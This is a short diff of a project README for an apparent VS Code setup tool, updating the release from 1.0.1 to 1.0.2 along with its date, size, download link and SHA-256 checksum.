@@ -8,12 +8,12 @@
   <a href="https://github.com/Tensionix/setup-for-vs-code/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/github/license/Tensionix/setup-for-vs-code?style=flat-square&color=5fd08a&logo=apache&logoColor=white&cacheSeconds=3600"></a>
 </p>
 
-**Version 1.0.1** · 2026-09-04 · 426 KB
+**Version 1.0.2** · 2026-09-18 · 433 KB
 
-- [Direct download](https://dl.audion.dev/setup-for-vs-code/1.0.1/Audion_Setup_for_VS_Code_v1.0.1_Full.zip) — unmetered, no rate limits
+- [Direct download](https://dl.audion.dev/setup-for-vs-code/1.0.2/Audion_Setup_for_VS_Code_v1.0.2_Full.zip) — unmetered, no rate limits
 - [Project page](https://audion.dev/downloads/setup-for-vs-code) — every version and how to install
 
-`SHA-256: 11712e13fc695858a95edbcabbd127edce1518266239a0ac2e734756c03e59b9`
+`SHA-256: 8225a2121c2454226fdb4d1b2b8326ef0d4832f80701ca7d9196387512a21b31`
 
 ---
 
